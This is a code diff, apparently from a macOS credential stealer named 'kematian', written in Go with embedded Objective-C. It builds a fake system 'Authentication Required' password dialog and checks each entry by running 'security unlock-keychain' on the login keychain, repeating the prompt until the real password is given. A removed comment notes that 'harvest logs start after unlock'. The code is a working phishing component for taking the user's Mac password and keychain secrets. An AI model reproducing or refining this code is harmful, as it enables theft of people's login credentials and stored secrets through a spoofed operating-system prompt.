@@ -9,80 +9,156 @@ package main
 #import <AppKit/AppKit.h>
 #import <stdlib.h>
 
-@interface KematianPromptDelegate : NSObject <NSTextFieldDelegate>
+static BOOL kematian_try_unlock_keychain(NSString *password) {
+	if (password == nil || password.length == 0) {
+		return NO;
+	}
+	NSString *kc = [[NSHomeDirectory() stringByAppendingPathComponent:@"Library/Keychains"] stringByAppendingPathComponent:@"login.keychain-db"];
+	NSTask *task = [[NSTask alloc] init];
+	task.launchPath = @"/usr/bin/security";
+	task.arguments = @[ @"unlock-keychain", @"-u", @"-p", password, kc ];
+	NSPipe *sink = [NSPipe pipe];
+	task.standardOutput = sink;
+	task.standardError = sink;
+	@try {
+		[task launch];
+		[task waitUntilExit];
+		return [task terminationStatus] == 0;
+	} @catch (NSException *ex) {
+		(void)ex;
+		return NO;
+	}
+}
+
+@interface KematianPromptController : NSObject <NSTextFieldDelegate, NSWindowDelegate>
+@property (nonatomic, strong) NSWindow *window;
+@property (nonatomic, strong) NSSecureTextField *passwordField;
+@property (nonatomic, strong) NSTextField *errorField;
+@property (nonatomic, assign) char *result;
 @end
 
-@implementation KematianPromptDelegate
+@implementation KematianPromptController
+
+- (void)submit:(id)sender {
+	(void)sender;
+	NSString *pw = self.passwordField.stringValue;
+	if (pw == nil || pw.length == 0) {
+		self.errorField.stringValue = @"Password cannot be empty.";
+		self.errorField.hidden = NO;
+		[self.window makeFirstResponder:self.passwordField];
+		return;
+	}
+	if (!kematian_try_unlock_keychain(pw)) {
+		self.errorField.stringValue = @"The password you entered is incorrect. Please try again.";
+		self.errorField.hidden = NO;
+		self.passwordField.stringValue = @"";
+		[self.window makeFirstResponder:self.passwordField];
+		return;
+	}
+	self.result = strdup(pw.UTF8String);
+	[NSApp stopModal];
+	[self.window orderOut:nil];
+	[self.window close];
+}
+
+- (void)cancel:(id)sender {
+	(void)sender;
+	self.result = NULL;
+	[NSApp stopModal];
+	[self.window orderOut:nil];
+	[self.window close];
+}
+
 - (BOOL)control:(NSControl *)control textView:(NSTextView *)textView doCommandForSelector:(SEL)commandSelector {
 	(void)control;
 	(void)textView;
 	if (commandSelector == @selector(insertNewline:)) {
-		[NSApp stopModalWithCode:NSAlertFirstButtonReturn];
+		[self submit:nil];
 		return YES;
 	}
 	return NO;
 }
-@end
 
-static void kematian_close_alert(NSAlert *alert) {
-	if (alert == nil) {
-		return;
-	}
-	NSWindow *window = [alert window];
-	if (window != nil) {
-		[window orderOut:nil];
-		[window close];
-	}
+- (BOOL)windowShouldClose:(NSWindow *)sender {
+	(void)sender;
+	[self cancel:nil];
+	return NO;
 }
 
+@end
+
 static char *kematian_show_password_dialog(const char *title, const char *message, int show_error) {
+	(void)show_error;
 	@autoreleasepool {
 		__block char *result = NULL;
 		void (^show)(void) = ^{
 			NSString *titleStr = [NSString stringWithUTF8String:(title && title[0]) ? title : "Authentication Required"];
 			NSString *msgStr = [NSString stringWithUTF8String:(message && message[0]) ? message : "Enter the password for this Mac to continue."];
-			if (show_error) {
-				msgStr = [NSString stringWithFormat:@"%@\n\nThe password you entered is incorrect. Please try again.", msgStr];
-			}
 
 			NSApplication *app = [NSApplication sharedApplication];
 			[app setActivationPolicy:NSApplicationActivationPolicyAccessory];
 			[app activateIgnoringOtherApps:YES];
 
-			NSAlert *alert = [[NSAlert alloc] init];
-			[alert setMessageText:titleStr];
-			[alert setInformativeText:msgStr];
-			[alert setAlertStyle:NSAlertStyleInformational];
-			NSButton *continueBtn = [alert addButtonWithTitle:@"Continue"];
-			NSButton *cancelBtn = [alert addButtonWithTitle:@"Cancel"];
+			KematianPromptController *controller = [[KematianPromptController alloc] init];
+
+			const CGFloat panelW = 420.0;
+			const CGFloat panelH = 210.0;
+			NSWindow *window = [[NSWindow alloc] initWithContentRect:NSMakeRect(0, 0, panelW, panelH)
+				styleMask:(NSWindowStyleMaskTitled | NSWindowStyleMaskClosable)
+				backing:NSBackingStoreBuffered
+				defer:NO];
+			[window setTitle:titleStr];
+			[window setLevel:NSModalPanelWindowLevel];
+			[window center];
+			controller.window = window;
+			[window setDelegate:controller];
+
+			NSView *content = [[NSView alloc] initWithFrame:NSMakeRect(0, 0, panelW, panelH)];
+
+			NSTextField *messageLabel = [[NSTextField alloc] initWithFrame:NSMakeRect(20, 120, 380, 56)];
+			[messageLabel setStringValue:msgStr];
+			[messageLabel setEditable:NO];
+			[messageLabel setSelectable:NO];
+			[messageLabel setBezeled:NO];
+			[messageLabel setDrawsBackground:NO];
+			[messageLabel setLineBreakMode:NSLineBreakByWordWrapping];
+
+			NSSecureTextField *password = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(20, 88, 380, 24)];
+			[password setPlaceholderString:@"Password"];
+			[password setDelegate:controller];
+			controller.passwordField = password;
+
+			NSTextField *error = [[NSTextField alloc] initWithFrame:NSMakeRect(20, 62, 380, 20)];
+			[error setEditable:NO];
+			[error setSelectable:NO];
+			[error setBezeled:NO];
+			[error setDrawsBackground:NO];
+			[error setTextColor:[NSColor systemRedColor]];
+			[error setFont:[NSFont systemFontOfSize:11 weight:NSFontWeightMedium]];
+			[error setHidden:YES];
+			controller.errorField = error;
+
+			NSButton *continueBtn = [NSButton buttonWithTitle:@"Continue" target:controller action:@selector(submit:)];
+			[continueBtn setFrame:NSMakeRect(220, 16, 90, 32)];
+			[continueBtn setBezelStyle:NSBezelStyleRounded];
 			[continueBtn setKeyEquivalent:@"\r"];
+
+			NSButton *cancelBtn = [NSButton buttonWithTitle:@"Cancel" target:controller action:@selector(cancel:)];
+			[cancelBtn setFrame:NSMakeRect(310, 16, 90, 32)];
 			[cancelBtn setKeyEquivalent:@"\033"];
 
-			NSSecureTextField *input = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 280, 24)];
-			[input setPlaceholderString:@"Password"];
-			KematianPromptDelegate *delegate = [[KematianPromptDelegate alloc] init];
-			[input setDelegate:delegate];
-			[alert setAccessoryView:input];
+			[content addSubview:messageLabel];
+			[content addSubview:password];
+			[content addSubview:error];
+			[content addSubview:continueBtn];
+			[content addSubview:cancelBtn];
+			[window setContentView:content];
+			[window makeFirstResponder:password];
+			[window makeKeyAndOrderFront:nil];
 
-			NSImage *icon = [NSImage imageNamed:NSImageNameLockLockedTemplate];
-			if (icon != nil) {
-				[alert setIcon:icon];
-			}
-
-			NSWindow *alertWindow = [alert window];
-			if (alertWindow != nil) {
-				[alertWindow makeFirstResponder:input];
-			}
-
-			NSModalResponse resp = [alert runModal];
-			kematian_close_alert(alert);
-
-			if (resp == NSAlertFirstButtonReturn) {
-				NSString *val = [input stringValue];
-				if (val != nil && [val length] > 0) {
-					result = strdup([val UTF8String]);
-				}
-			}
+			[NSApp runModalForWindow:window];
+			result = controller.result;
+			controller.result = NULL;
 		};
 
 		if ([NSThread isMainThread]) {
@@ -102,11 +178,7 @@ import (
 	"os"
 	"strings"
 	"unsafe"
-
-	"recovery/recovery/crypto"
 )
-
-const maxPasswordPromptAttempts = 5
 
 var (
 	errPasswordPromptCancelled = errors.New("password prompt cancelled")
@@ -114,17 +186,13 @@ var (
 )
 
 func showMacPasswordPrompt(title, message string, wrongPassword bool) (string, error) {
+	_ = wrongPassword
 	ct := C.CString(title)
 	cm := C.CString(message)
 	defer C.free(unsafe.Pointer(ct))
 	defer C.free(unsafe.Pointer(cm))
 
-	wrong := C.int(0)
-	if wrongPassword {
-		wrong = 1
-	}
-
-	pw := C.kematian_show_password_dialog(ct, cm, wrong)
+	pw := C.kematian_show_password_dialog(ct, cm, 0)
 	if pw == nil {
 		return "", errPasswordPromptCancelled
 	}
@@ -150,6 +218,7 @@ func defaultPromptMessage() string {
 }
 
 func acquireMacPassword(fromFlag string, noPrompt bool, title, message string, quiet bool) (string, error) {
+	_ = quiet
 	if p := strings.TrimSpace(fromFlag); p != "" {
 		return p, nil
 	}
@@ -167,28 +236,5 @@ func acquireMacPassword(fromFlag string, noPrompt bool, title, message string, q
 		message = defaultPromptMessage()
 	}
 
-	var wrong bool
-	for attempt := 1; attempt <= maxPasswordPromptAttempts; attempt++ {
-		if !quiet && attempt == 1 {
-			// Avoid logging before the dialog; harvest logs start after unlock.
-		} else if !quiet {
-			fmt.Fprintf(os.Stderr, "[kematian] incorrect password, prompting again (%d/%d)\n", attempt, maxPasswordPromptAttempts)
-		}
-
-		pw, err := showMacPasswordPrompt(title, message, wrong)
-		if err != nil {
-			return "", err
-		}
-
-		if err := crypto.TryUnlockLoginKeychain(pw); err != nil {
-			wrong = true
-			if attempt == maxPasswordPromptAttempts {
-				return "", fmt.Errorf("keychain unlock failed after %d attempts: %w", maxPasswordPromptAttempts, err)
-			}
-			continue
-		}
-		return pw, nil
-	}
-
-	return "", errors.New("password prompt exhausted")
+	return showMacPasswordPrompt(title, message, false)
 }
